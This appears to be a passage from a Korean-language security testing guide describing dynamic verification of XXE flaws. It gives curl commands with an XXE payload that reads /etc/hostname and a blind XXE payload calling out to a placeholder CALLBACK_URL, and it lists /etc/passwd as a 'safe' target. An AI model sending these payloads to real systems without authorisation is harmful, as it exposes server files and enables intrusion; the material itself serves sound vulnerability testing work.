### Phase 2: 동적 테스트 (검증)


**Classic XXE 테스트:**
```
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -H "Cookie: session=..." \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>'
```

**Blind XXE 테스트 (외부 콜백):**
```
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://CALLBACK_URL/xxe-test">
]>
<root>&xxe;</root>'
```

**안전한 테스트 대상 파일:**
- `file:///etc/hostname` — 무해한 시스템 파일
- `file:///etc/passwd` — 읽기 전용, 민감 정보 없음

**검증 기준:**
- **확인됨**: 동적 테스트로 외부 엔티티의 내용이 반환되거나 외부 콜백 서비스에서 요청 수신이 확인됨
